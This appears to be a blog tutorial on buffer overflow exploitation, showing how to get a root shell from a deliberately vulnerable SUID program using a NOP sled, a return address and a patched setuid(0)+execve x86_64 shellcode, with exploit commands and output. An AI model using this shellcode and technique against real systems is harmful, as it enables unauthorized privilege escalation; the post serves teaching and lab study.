---
layout: post
title: "Buffer overflow - getting a root shell"
date: 2020-01-02
tags: [security, linux, programming, vulnerabilities]
---

Getting a root shell
------------------------------

The vulnerable program from the previous article spawned a shell when we exploited it, but the shell did not get us any special permissions. That's to be expected, as the vulnerable program ran with normal user privileges.

There are multiple ways to go from normal user privilege to super user privilege, and we'll look more at this later, but for now we'll focus on SUID binaries.

### SUID binaries

When root is the owner of a file, and the SUID/setuid bit is set, the program runs (when executed by a normal user) with the highest privlege.

To turn `bo_vuln1` into a SUID root binary, we set root as the owner, and set the SUID bit:

```bash
$ sudo chown root bo_vuln1
$ sudo chmod u+s  bo_vuln1
$ ls -l bo_vuln1
-rwsrwxr-x. 1 root user 19552 Jul 22 17:19 bo_vuln1
```

When we execute the above program, we run it with using our *real* user ID (the user we are logged in as), but the program runs with root as its *effective* user ID.

> The SUID bit makes a program run with the *owner's* privileges. It is displayed as "s" in the file permissions (e.g. `ls -l` output).

### Prevent privilege drop in bash

Running the same exploit as earlier, on the now SUID root `bo_vuln1`, we still get a shell with no special privileges:

```bash
$ env - PWD=$PWD SHLVL=0 $PWD/bo_vuln1 `python -c 'print 30 * "\x90" + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 17 * "a" + 8 * "b" + "\x38\xec\xff\xff\xff\x7f"'`
sh-4.4$
```

This happens because bash (and most other modern shells) will set the effective user ID to the real user ID unless we use the `-p`  option, i.e. the root privilege is *dropped*.

> The `-p` option in bash is the same as `-o privileged`.

We can see that this is true by calling `execve` to launch a shell (which is the method used by our shellcode) in a small suid root program:

```c
/*
 * rootsh.c
 * gcc rootsh.c -o rootsh -std=c99
 */

#include <unistd.h>

int main()
{
    execve("/bin/sh", (char *[]){"/bin/sh", "-p", NULL}, NULL);
}
```

After compiling, set root as owner, and set the setuid bit:

```
$ sudo chown root rootsh
[sudo] password for <user>:
$ sudo chmod u+s rootsh
$ ls -l rootsh
-rwsrwxr-x. 1 root user 18288 Aug  8 21:12 rootsh
```

When the program is executed by a normal user, it spawns a root shell:

```
$ ./rootsh
sh-4.4# whoami
root
sh-4.4#
```

> Delete the file or remove the setuid bit by using `chmod -s <FILE>`. Don't leave vulnerable programs with a SUID bit, it's probably smart the create a "superuser" or similar *normal* user to use as the owner of a SUID file for educational purposes.

On 32-bit systems "/bin/sh -p" shellcode is easy to create since arguments to functions are passed on the stack, but on 64-bit it's difficult since registers are used to pass arguments (the string with the "-p" option is too long for a register).

> We'll look more at the challenges of writing shellcode in a later chapter.

An alternative to using the `-p` option is to use a shellcode which first runs `setuid()` to set the user identity to uid 0 (root), then execute a shell. Let's grab a shellcode from shell-storm.org.

> I've chosen the 48 byte Linux x86_64 `setuid(0) + execve(/bin/sh)` by xi4oyu, available at http://shell-storm.org/shellcode/files/shellcode-77.php. The author did not zero out `rax` before moving the system call number for `execve` into the lower 8 bits of the register, so the call to `setuid` could fail. I've prefixed three bytes in the shellcode below that zeroes out `rax`, making the shellcode 51 bytes.

The bytes of the (fixed) shellcode are as follows:

```
\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05
```

`bo_vuln1` is still set with root as owner and with the SUID bit. Let's run the shellcode (note that the NOP sled is decreased since the shellcode is longer):

```bash
$ env - PWD=$PWD SHLVL=0 $PWD/bo_vuln1 `python -c 'print 12 * "\x90" + "\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05" + 17 * "a" + 8 * "b" + "\x38\xec\xff\xff\xff\x7f"'`
sh-4.4# echo $EUID
0
sh-4.4# whoami
root
sh-4.4#
```

> Filesystems mounted with the `nosuid` mount option in (see the file `/proc/mounts`) will ignore the SUID or SGID bit, making this type of privilege escalation impossible.

